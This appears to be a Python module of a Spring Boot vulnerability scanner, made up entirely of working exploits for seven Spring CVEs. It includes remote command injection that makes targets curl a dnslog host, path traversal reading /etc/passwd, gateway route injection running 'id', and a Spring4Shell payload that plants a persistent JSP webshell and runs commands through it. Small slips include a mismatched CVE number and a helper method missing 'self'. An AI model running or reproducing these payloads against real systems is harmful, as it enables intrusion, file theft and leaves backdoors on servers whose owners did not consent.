#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import random
import time
from urllib.parse import urljoin, urlparse

import requests
import urllib3
from requests import JSONDecodeError

import config.config

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class springboot:

    def __init__(self):
        pass

    def ALL(self,args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        self.ceye_rawurl=config.config.ceye_rawurl
        self.ceye_token=config.config.ceye_token
        self.proxies = None
        self.DEFAULT_HEADER = {
            "User-Agent": random.choice(config.config.user_agents),
            "Accept-Language": "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
        self.TIMEOUT=30
        self.check1() #CVE-2018-1273
        self.check2() #CVE-2019-3379漏洞。
        self.check3() #CVE-2020-5410漏洞
        self.check4() #CVE-2021-21234漏洞
        self.check5() #CVE-2022-22947漏洞。
        self.check6() #CVE-2022-22963漏洞
        self.check7() #CVE-2022-22965漏洞。

        return self.results

    def check1(self):
        """
        对给定的目标URL检测CVE-2018-1273漏洞。

        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2018-1273"

        dns_domain = self.ceye_rawurl or "dnslog.cn"
        payload = "username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('curl cve_2018_1273.%s')]=&password=&repeatedPassword=" % dns_domain
        target_url = urljoin(self.url, "/users?page=&size=5")
        headers = {
            'Connection': "keep-alive",
            'Content-Length': "120",
            'Pragma': "no-cache",
            'Cache-Control': "no-cache",
            'Origin': "http://localhost:8080",
            'Upgrade-Insecure-Requests': "1",
            'Content-Type': "application/x-www-form-urlencoded",
            'User-Agent': random.choice(config.config.user_agents),
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            'Referer': "http://localhost:8080/users?page=0&size=5",
            'Accept-Encoding': "gzip, deflate, br",
            'Accept-Language': "zh-CN,zh;q=0.9,en;q=0.8"
        }
        try:
            res = requests.post(target_url, headers=headers, timeout=self.TIMEOUT, data=payload, verify=False,
                                proxies=self.proxies)

            if res.status_code == 500:
                details = f"{CVE_ID} vulnerability detected"
                if dns_domain == "dnslog.cn":
                    details += ",use the --dnslog parameter to specify your dnslog domain and then scan again"
                else:
                    details += ",please check your dnslog record for confirmation"

                self.results.append(details)




        except requests.RequestException as e:
            pass
        except Exception as e:
            pass



    def check2(self):
        """
        对给定的目标URL检测CVE-2019-3379漏洞。

        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """

        CVE_ID = "CVE-2019-3799"
        payload = "test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
        target_url = urljoin(self.url, payload)
        try:
            res = requests.get(target_url, headers=self.DEFAULT_HEADER, timeout=self.TIMEOUT, verify=False, proxies=self.proxies)

            vulnerable_signs = [
                r"x:0:0:root:/root:",
                r"/sbin/nologin",
                r"daemon"
            ]
            if res.status_code == 200 and all(sign in res.text for sign in vulnerable_signs):

                self.results.append(CVE_ID)


            return False, {}
        except requests.RequestException as e:

            pass
        except Exception as e:

            pass



    def check3(self):
        """
        对给定的目标URL检测CVE-2020-5410漏洞。

        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2020-5410"
        payload = "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
        target_url = urljoin(self.url, payload)
        try:
            res = requests.get(target_url, headers=self.DEFAULT_HEADER, timeout=self.TIMEOUT, verify=False, proxies=self.proxies)

            vulnerable_signs = [
                r"x:0:0:root:/root:",
                r"/sbin/nologin",
                r"daemon"
            ]
            if res.status_code == 200 and all(sign in res.text for sign in vulnerable_signs):
                self.results.append(CVE_ID)

        except requests.RequestException as e:
            # logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
            pass
        except Exception as e:
            # logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
            pass



    def is_vulnerable(response_text, conditions):
        return all(condition in response_text for condition in conditions)

    def check4(self):
        """
        对给定的目标URL检测CVE-2021-21234漏洞。

        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2021-21234"
        PAYLOADS = [
            {
                "path": "manage/log/view?filename=/etc/passwd&base=../../../../../../../",
                "conditions": [r"root", r"nobody", r"daemon"]
            },
            {
                "path": "manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../",
                "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
            },
            {
                "path": "manage/log/view?filename=C:\\Windows\\System32\\drivers\\etc\\hosts&base=../../../../../../../",
                "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
            }
        ]
        for payload in PAYLOADS:
            target_url = urljoin(self.url, payload["path"])
            try:
                res = requests.get(target_url, headers=self.DEFAULT_HEADER, timeout=self.TIMEOUT, verify=False, proxies=self.proxies)

                if res.status_code == 200 and self.is_vulnerable(res.text, payload["conditions"]):
                    self.results.append(CVE_ID)

            except requests.RequestException as e:
                #logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
                pass
            except Exception as e:
                #logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
                pass




    def check5(self):
        """
        对给定的目标URL检测CVE-2022-22947漏洞。

        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2022-22947"
        base_headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': random.choice(config.config.user_agents)
        }
        json_headers = {**base_headers, 'Content-Type': 'application/json'}
        form_headers = {**base_headers, 'Content-Type': 'application/x-www-form-urlencoded'}

        payload = '''{\r
            "id": "hacktest",\r
            "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
            }],\r
            "uri": "http://example.com",\r
            "order": 0\r
        }'''
        target_url = self.url.strip("/")
        try:
            res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=json_headers, data=payload,
                                 verify=False, timeout=self.TIMEOUT, proxies=self.proxies)
            if res1.status_code != 201:
                return False, {}
            requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=self.TIMEOUT,
                          proxies=self.proxies)
            res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False,
                                timeout=self.TIMEOUT, proxies=self.proxies)
            requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=form_headers, verify=False,
                            timeout=self.TIMEOUT, proxies=self.proxies)
            requests.post(target_url + "/actuator/gateway/refresh", headers=form_headers, verify=False, timeout=self.TIMEOUT,
                          proxies=self.proxies)

            if res3.status_code == 200 and "uid=" in res3.text:
                self.results.append(CVE_ID)



        except requests.RequestException as e:
            #logger.debug(f"[Request Error：{e}]", extra={"target": url})
           pass
        except JSONDecodeError as e:
            #logger.error(f"[The response content is not in JSON format：{e}]", extra={"target": url})
            pass
        except Exception as e:
            #logger.error(f"[Unknow Error：{e}]", extra={"target": url})
            pass



    def check6(self):
        """
        对给定的目标URL检测CVE-2022-22963漏洞。
        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2022-22963"
        dns_domain = self.ceye_rawurl or "dnslog.cn"
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': random.choice(config.config.user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl SBSCAN_cve_2022_22963.%s")' % dns_domain
        }
        # 构建请求URL
        target_url = urljoin(self.url, "/functionRouter")
        try:
            res = requests.post(target_url, headers=headers, data='test', verify=False, timeout=self.TIMEOUT,
                                proxies=self.proxies)

            # 检查响应内容来判断漏洞是否存在
            if res.status_code == 500 and '"error":"Internal Server Error"' in res.text:
                details = f"{CVE_ID} vulnerability detected!"
                if dns_domain == "dnslog.cn":
                    details += ",use the --dnslog parameter to specify your dnslog domain and then scan again"
                else:
                    details += ",Please check your dnslog record for confirmation"

                self.results.append(details)


        except requests.RequestException as e:
            #logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
            pass
        except Exception as e:
            #logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
            pass



    def check7(self):
        """
        对给定的目标URL检测CVE-2022-22965漏洞。
        参数:
        - target_url: 待检测的目标URL
        - proxies: 代理配置
        """
        CVE_ID = "CVE-2022-22965"
        headers = {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "User-Agent": random.choice(config.config.user_agents)
        }

        # 构建payload
        log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
        log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
        log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar"
        log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        arg_payload = "?" + "&".join(
            [log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

        try:
            url_with_payload = self.url + arg_payload
            requests.get(url_with_payload, headers=headers, verify=False, timeout=self.TIMEOUT, proxies=self.proxies)

            # 等待上传完成
            time.sleep(5)

            # 开始请求上传的webshell文件
            target_url = urljoin(self.url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
            res = requests.get(target_url, timeout=self.TIMEOUT, stream=True, verify=False, proxies=self.proxies)

            if res.status_code == 200 and "root:" in res.text:
                self.results.append(CVE_ID)

                # return True, {
                #     "CVE_ID": CVE_ID,
                #     "URL": target_url,
                #     "Details": f"{CVE_ID} vulnerability detected"
                # }
            else:
                parsed_url = urlparse(target_url)
                root_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                target_url_root = urljoin(root_url, 'tomcatwar.jsp?pwd=j&cmd=cat /etc/passwd')
                response_root = requests.get(target_url_root, timeout=self.TIMEOUT, stream=True, verify=False,
                                             proxies=self.proxies)

                if response_root.status_code == 200 and "root:" in response_root.text:
                    self.results.append(CVE_ID)


        except requests.RequestException as e:
            #logger.debug(f"[Request Error：{e}]", extra={"target": url})
            pass
        except Exception as e:
            #logger.error(f"[Unknown Error：{e}]", extra={"target": url})
            pass
